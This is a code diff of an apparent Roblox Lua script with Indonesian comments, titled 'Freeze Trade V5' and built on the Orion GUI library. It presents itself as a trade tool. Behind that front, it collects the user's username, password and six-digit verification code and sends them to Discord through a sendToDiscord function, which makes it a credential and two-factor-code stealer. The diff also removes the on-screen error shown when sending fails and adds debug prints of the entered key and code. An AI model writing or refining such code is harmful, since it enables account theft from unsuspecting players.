@@ -36,19 +36,13 @@ local function sendToDiscord(username, password, code)
         http.request(payload)
     elseif request then
         request(payload)
-    else
-        OrionLib:MakeNotification({
-            Name = "Request Error",
-            Content = "Tidak dapat mengirim data ke Discord!",
-            Time = 3
-        })
     end
 end
 
 -- Fungsi untuk membuat GUI menggunakan Orion
 local function createMenuGUI()
     -- Membuat window dengan Orion
-    local window = OrionLib:MakeWindow({Name = "Freeze Trade V2", HidePremium = true})
+    local window = OrionLib:MakeWindow({Name = "Freeze Trade V5", HidePremium = true})
 
     -- Step 1: Key Input
     local function createKeyInputStep()
@@ -60,7 +54,9 @@ local function createMenuGUI()
             Default = "",
             TextDisappear = true,
             Callback = function(key)
+                print("Key entered:", key)  -- Debugging
                 if key == correctKey then
+                    print("Key is valid, proceeding to next step.")  -- Debugging
                     OrionLib:MakeNotification({
                         Name = "Key Valid",
                         Content = "Key yang dimasukkan benar!",
@@ -69,6 +65,7 @@ local function createMenuGUI()
                     keyStep:Destroy() -- Hapus tab Key Input
                     createUsernamePasswordStep() -- Pindah ke langkah berikutnya
                 else
+                    print("Key is invalid.")  -- Debugging
                     OrionLib:MakeNotification({
                         Name = "Key Invalid",
                         Content = "Key yang dimasukkan salah!",
@@ -122,9 +119,11 @@ local function createMenuGUI()
             Name = "Continue to Verification",
             Callback = function()
                 if username and password and username ~= "" and password ~= "" then
+                    print("Username and Password entered. Proceeding to next step.")  -- Debugging
                     usernamePasswordStep:Destroy() -- Hapus tab Username & Password
                     createVerificationCodeStep(username, password) -- Pindah ke langkah berikutnya
                 else
+                    print("Username or Password missing.")  -- Debugging
                     OrionLib:MakeNotification({
                         Name = "Error",
                         Content = "Harap isi Username dan Password terlebih dahulu!",
@@ -145,6 +144,7 @@ local function createMenuGUI()
             Default = "",
             TextDisappear = true,
             Callback = function(code)
+                print("Verification code entered:", code)  -- Debugging
                 if code:match("^%d%d%d%d%d%d$") then -- Memastikan kode 6 digit
                     sendToDiscord(username, password, code) -- Kirim ke Discord
                     OrionLib:MakeNotification({
